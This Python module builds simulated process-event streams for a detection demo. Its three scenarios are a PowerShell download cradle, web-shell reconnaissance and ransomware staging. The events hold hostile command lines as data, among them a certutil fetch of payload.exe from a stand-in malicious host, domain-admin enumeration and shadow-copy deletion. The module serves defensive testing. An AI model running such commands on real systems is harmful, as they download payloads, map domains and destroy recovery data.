"""
Simulated attack scenarios for the cyber-sentinels demo.

Each function returns (events_list, scenario_name).
The sensor watches the event stream and detects the trigger naturally —
the same is_trigger() logic used in real psutil monitoring applies here too.
"""

from datetime import datetime, timedelta


def _ts(base: datetime, seconds: int) -> str:
    return (base + timedelta(seconds=seconds)).strftime("%H:%M:%S")


def get_scenario_a():
    """Scenario A: PowerShell download cradle."""
    base = datetime.now()

    events = [
        {
            "timestamp": _ts(base, 0),
            "pid": 1234,
            "name": "explorer.exe",
            "parent_pid": None,
            "parent_name": None,
            "cmdline": "explorer.exe",
            "action": "process_start",
        },
        {
            "timestamp": _ts(base, 1),
            "pid": 5432,
            "name": "cmd.exe",
            "parent_pid": 1234,
            "parent_name": "explorer.exe",
            "cmdline": "cmd.exe /c",
            "action": "process_start",
        },
        {
            "timestamp": _ts(base, 2),
            "pid": 6789,
            "name": "powershell.exe",
            "parent_pid": 5432,
            "parent_name": "cmd.exe",
            "cmdline": "powershell.exe -EncodedCommand JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
            "action": "process_start",
        },
        {
            "timestamp": _ts(base, 4),
            "pid": 7890,
            "name": "certutil.exe",
            "parent_pid": 6789,
            "parent_name": "powershell.exe",
            "cmdline": "certutil.exe -urlcache -f http://malicious.example.com/payload.exe C:\\Users\\Public\\payload.exe",
            "action": "process_start",
        },
        {
            "timestamp": _ts(base, 6),
            "pid": 7890,
            "name": "certutil.exe",
            "parent_pid": 6789,
            "parent_name": "powershell.exe",
            "cmdline": "certutil.exe -urlcache -f http://malicious.example.com/payload.exe C:\\Users\\Public\\payload.exe",
            "action": "network_connection",
            "detail": "Outbound TCP connection to 203.0.113.99:80 (malicious.example.com)",
        },
    ]

    return events, "PowerShell Download Cradle"


def get_scenario_b():
    """Scenario B: Web shell activity."""
    base = datetime.now()

    events = [
        {
            "timestamp": _ts(base, 0),
            "pid": 5678,
            "name": "w3wp.exe",
            "parent_pid": 4567,
            "parent_name": "svchost.exe",
            "cmdline": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap DefaultAppPool",
            "action": "process_start",
        },
        {
            "timestamp": _ts(base, 1),
            "pid": 6543,
            "name": "cmd.exe",
            "parent_pid": 5678,
            "parent_name": "w3wp.exe",
            "cmdline": "cmd.exe /c whoami",
            "action": "process_start",
        },
        {
            "timestamp": _ts(base, 3),
            "pid": 6544,
            "name": "cmd.exe",
            "parent_pid": 5678,
            "parent_name": "w3wp.exe",
            "cmdline": "cmd.exe /c net user",
            "action": "process_start",
        },
        {
            "timestamp": _ts(base, 5),
            "pid": 6545,
            "name": "cmd.exe",
            "parent_pid": 5678,
            "parent_name": "w3wp.exe",
            "cmdline": "cmd.exe /c ipconfig /all",
            "action": "process_start",
        },
        {
            "timestamp": _ts(base, 7),
            "pid": 6546,
            "name": "cmd.exe",
            "parent_pid": 5678,
            "parent_name": "w3wp.exe",
            "cmdline": 'cmd.exe /c net group "Domain Admins" /domain',
            "action": "process_start",
        },
    ]

    return events, "Web Shell Activity"


def get_scenario_c():
    """Scenario C: Ransomware staging."""
    base = datetime.now()

    events = [
        {
            "timestamp": _ts(base, 0),
            "pid": 8888,
            "name": "update.exe",
            "parent_pid": None,
            "parent_name": None,
            "cmdline": "C:\\Users\\Public\\AppData\\Local\\Temp\\update.exe",
            "action": "process_start",
            "detail": "Unsigned binary — path: C:\\Users\\Public\\AppData\\Local\\Temp\\update.exe",
        },
        {
            "timestamp": _ts(base, 1),
            "pid": 9001,
            "name": "vssadmin.exe",
            "parent_pid": 8888,
            "parent_name": "update.exe",
            "cmdline": "vssadmin.exe delete shadows /all /quiet",
            "action": "process_start",
        },
        {
            "timestamp": _ts(base, 3),
            "pid": 8888,
            "name": "update.exe",
            "parent_pid": None,
            "parent_name": None,
            "cmdline": "C:\\Users\\Public\\AppData\\Local\\Temp\\update.exe",
            "action": "file_rename",
            "detail": "Mass rename: Desktop\\*.* → Desktop\\*.locked (47 files)",
        },
        {
            "timestamp": _ts(base, 4),
            "pid": 8888,
            "name": "update.exe",
            "parent_pid": None,
            "parent_name": None,
            "cmdline": "C:\\Users\\Public\\AppData\\Local\\Temp\\update.exe",
            "action": "file_rename",
            "detail": "Mass rename: Documents\\*.* → Documents\\*.locked (213 files)",
        },
        {
            "timestamp": _ts(base, 5),
            "pid": 8888,
            "name": "update.exe",
            "parent_pid": None,
            "parent_name": None,
            "cmdline": "C:\\Users\\Public\\AppData\\Local\\Temp\\update.exe",
            "action": "file_rename",
            "detail": "Mass rename: Downloads\\*.* → Downloads\\*.locked (89 files)",
        },
        {
            "timestamp": _ts(base, 6),
            "pid": 9002,
            "name": "notepad.exe",
            "parent_pid": 8888,
            "parent_name": "update.exe",
            "cmdline": "notepad.exe C:\\Users\\Public\\Desktop\\README_DECRYPT.txt",
            "action": "process_start",
        },
    ]

    return events, "Ransomware Staging"
